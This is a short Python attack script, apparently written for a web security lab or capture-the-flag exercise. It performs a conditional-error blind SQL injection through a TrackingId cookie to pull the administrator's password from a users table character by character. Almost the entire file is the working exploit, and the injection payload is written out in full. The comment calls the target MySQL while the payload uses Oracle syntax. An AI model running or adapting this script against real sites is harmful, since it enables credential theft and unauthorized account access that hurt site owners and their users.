#!/usr/bin/env python3

import requests
import string

#This script dumps the flag from a MySQL database via conditional error SQL injection

url = "https://<URL>/filter?category=Lifestyle"
characters = string.ascii_letters + string.digits + "-" + "."
flag = []
sesh = requests.Session()
counter = 1

while True:
    for i in characters:
        header = {"Cookie" : f"TrackingId=XMkXdaxM319jCM9w' union SELECT case when (username = 'administrator' and substr(password, {counter}, 1) = '{i}') then to_char(1/0) else NULL end from users--"}
        attempt = sesh.get(url, headers=header)

        if "Internal Server Error" not in attempt.text:
            print(f"Trying {''.join(flag)}{i}")
    
        else:
            flag.append(i)
            counter = counter + 1
            print(f"Found {''.join(flag)}")